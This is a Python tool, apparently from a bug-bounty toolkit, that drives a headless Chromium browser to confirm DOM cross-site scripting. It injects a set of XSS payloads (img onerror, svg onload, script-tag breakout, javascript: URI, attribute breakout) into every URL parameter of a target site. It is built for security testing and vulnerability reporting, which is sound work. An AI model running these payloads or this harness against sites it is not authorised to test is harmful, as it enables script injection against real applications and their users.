#!/usr/bin/env python3
"""
DOM XSS harness — CONFIRMS client-side JS execution in a real browser.

The rest of the toolkit is confirmation-poor for client-side bugs: reflected-XSS
scanners see a payload echoed in HTML, but they can't tell whether it actually
*executed* — CSP, framework auto-escaping, or a sink that never reaches
`eval`/`innerHTML` all silently neuter it. This drives a headless Chromium
(Playwright), injects a uniquely-tagged payload into each parameter and the URL
fragment, and only reports a finding when the browser fires the payload's canary
(via `alert`/`prompt`/`confirm`, a hooked sink, or a canary marker in the DOM).

That turns "reflected, maybe exploitable" into a proven `[CONFIRMED]` DOM XSS —
and the same run captures a screenshot for the report.

Payload generation, URL construction, and event→finding classification are pure
and unit-tested. Only `run()` imports Playwright and touches a browser, so the
suite (and CI) need no browser installed.

Usage:
  tools/dom_xss_harness.py "https://app.target.com/search?q=test"
  tools/dom_xss_harness.py "https://app.target.com/#name=x" --params q,name,redirect
  tools/dom_xss_harness.py URL --json --shot shots/domxss.png
"""
from __future__ import annotations

import argparse
import json
import sys
import uuid
from dataclasses import dataclass, asdict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

USER_AGENT = "agentic-bug-hunter/dom_xss_harness"

CONFIRMED, POSSIBLE = "[CONFIRMED]", "[POSSIBLE]"


def canary() -> str:
    """A unique, greppable marker so an execution can't be confused with a
    coincidental page string. Kept short — some sinks truncate."""
    return "cbbx" + uuid.uuid4().hex[:10]


@dataclass
class Payload:
    marker: str          # the canary this payload carries
    param: str           # which parameter / injection point it targets
    vector: str          # human label for the sink class it probes
    raw: str             # the payload string itself


def dom_payloads(param: str, marker: str) -> list[Payload]:
    """Pure: a battery of DOM-sink payloads for one injection point, each
    embedding `marker` so execution is unambiguous. Fires the marker through
    the common sinks: inline handler, <script>, <svg onload>, javascript: URI,
    and a broken-tag breakout."""
    js = f"window.__cbbx&&window.__cbbx('{marker}');alert('{marker}')"
    return [
        Payload(marker, param, "img-onerror", f'"><img src=x onerror="{js}">'),
        Payload(marker, param, "svg-onload", f'"><svg onload="{js}">'),
        Payload(marker, param, "script-tag", f"</script><script>{js}</script>"),
        Payload(marker, param, "js-uri", f"javascript:{js}"),
        Payload(marker, param, "attr-breakout", f"' onmouseover='{js}' x='"),
    ]


def _split_fragment_params(fragment: str) -> dict[str, list[str]]:
    return parse_qs(fragment) if fragment and "=" in fragment else {}


def discover_params(url: str) -> list[str]:
    """Pure: parameter names to fuzz — query string + fragment keys."""
    parsed = urlparse(url)
    names = list(parse_qs(parsed.query).keys())
    names += [k for k in _split_fragment_params(parsed.fragment) if k not in names]
    return names


def inject(url: str, param: str, payload: str) -> str:
    """Pure: return `url` with `param` set to `payload`, preserving whether the
    parameter lived in the query string or the fragment (both are DOM sinks)."""
    parsed = urlparse(url)
    frag_params = _split_fragment_params(parsed.fragment)
    if param in frag_params and param not in parse_qs(parsed.query):
        frag_params[param] = [payload]
        new_fragment = urlencode(frag_params, doseq=True)
        return urlunparse(parsed._replace(fragment=new_fragment))
    query = parse_qs(parsed.query)
    query[param] = [payload]
    new_query = urlencode(query, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


@dataclass
class Finding:
    url: str
    param: str
    vector: str
    marker: str
    severity: str
    evidence: str
    screenshot: str = ""


def classify(url: str, payload: Payload, fired_markers: set[str], dom_html: str) -> Finding | None:
    """Pure: decide the verdict for one payload after the browser ran.

    CONFIRMED — the payload's unique marker fired through an execution sink
                (dialog / hooked `window.__cbbx` / console), proving JS ran.
    POSSIBLE  — the marker is present in the DOM but did not execute (reflected
                but likely neutralized by CSP/escaping — still worth a look).
    None      — no trace of the marker; nothing to report.
    """
    if payload.marker in fired_markers:
        return Finding(url, payload.param, payload.vector, payload.marker,
                       CONFIRMED, f"canary {payload.marker} executed via {payload.vector}")
    if payload.marker in (dom_html or ""):
        return Finding(url, payload.param, payload.vector, payload.marker,
                       POSSIBLE, f"canary {payload.marker} reflected but did not execute")
    return None


def run(url: str, params: list[str], timeout_ms: int, shot: str | None) -> list[Finding]:
    """Drive headless Chromium over every (param, payload). Lazy-imports
    Playwright so the pure core above stays importable without a browser."""
    try:
        from playwright.sync_api import sync_playwright  # noqa: WPS433 (lazy on purpose)
    except ImportError as exc:  # pragma: no cover - exercised only without the dep
        raise FileNotFoundError("playwright") from exc

    targets = params or discover_params(url)
    if not targets:
        raise ValueError("no parameters to test — pass --params or include ?query/#fragment in the URL")

    findings: list[Finding] = []
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        for param in targets:
            for payload in dom_payloads(param, canary()):
                fired: set[str] = set()
                ctx = browser.new_context(user_agent=USER_AGENT, ignore_https_errors=True)
                page = ctx.new_page()
                # Hook every execution channel to the payload's canary.
                page.expose_function("__cbbx", lambda m, _f=fired: _f.add(m))
                page.on("dialog", lambda d, _f=fired: (_f.add(d.message), d.dismiss()))
                page.on("console", lambda msg, _f=fired: _f.add(msg.text))
                target_url = inject(url, param, payload.raw)
                try:
                    page.goto(target_url, timeout=timeout_ms, wait_until="load")
                    page.wait_for_timeout(400)  # let async sinks fire
                    dom_html = page.content()
                except Exception as exc:  # noqa: BLE001 - a broken nav shouldn't kill the sweep
                    dom_html = ""
                    fired.discard("")  # nothing fired
                    print(f"[!] {param}/{payload.vector}: {type(exc).__name__}", file=sys.stderr)
                finding = classify(target_url, payload, fired, dom_html)
                if finding and finding.severity == CONFIRMED and shot:
                    try:
                        page.screenshot(path=shot)
                        finding.screenshot = shot
                    except Exception:  # noqa: BLE001
                        pass
                if finding:
                    findings.append(finding)
                ctx.close()
        browser.close()
    return findings


def _render(findings: list[Finding], as_json: bool) -> str:
    confirmed = [f for f in findings if f.severity == CONFIRMED]
    if as_json:
        return json.dumps({"confirmed": len(confirmed), "total": len(findings),
                           "findings": [asdict(f) for f in findings]}, indent=2)
    if not findings:
        return "[*] No DOM XSS: no canary reflected or executed."
    lines = [f"[*] {len(confirmed)} CONFIRMED, {len(findings) - len(confirmed)} possible"]
    for f in sorted(findings, key=lambda x: 0 if x.severity == CONFIRMED else 1):
        lines.append(f"    {f.severity} {f.param} via {f.vector}")
        lines.append(f"            {f.url}")
    if confirmed:
        lines.append("")
        lines.append("[+] CONFIRMED = the payload actually executed in-browser. Report-ready.")
    return "\n".join(lines)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Confirm DOM XSS in a real headless browser.")
    ap.add_argument("url", help="target URL (include ?query and/or #fragment to seed params)")
    ap.add_argument("--params", help="comma-separated parameter names to fuzz")
    ap.add_argument("--timeout", type=int, default=10000, help="per-page navigation timeout ms")
    ap.add_argument("--shot", help="screenshot path for the first CONFIRMED hit")
    ap.add_argument("--json", action="store_true", help="JSON output")
    args = ap.parse_args(argv)

    params = [p.strip() for p in args.params.split(",")] if args.params else []
    try:
        findings = run(args.url, params, args.timeout, args.shot)
    except FileNotFoundError:
        print("[-] Playwright is not installed.\n"
              "    pip install playwright && playwright install chromium",
              file=sys.stderr)
        return 127
    except ValueError as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 2

    print(_render(findings, args.json))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
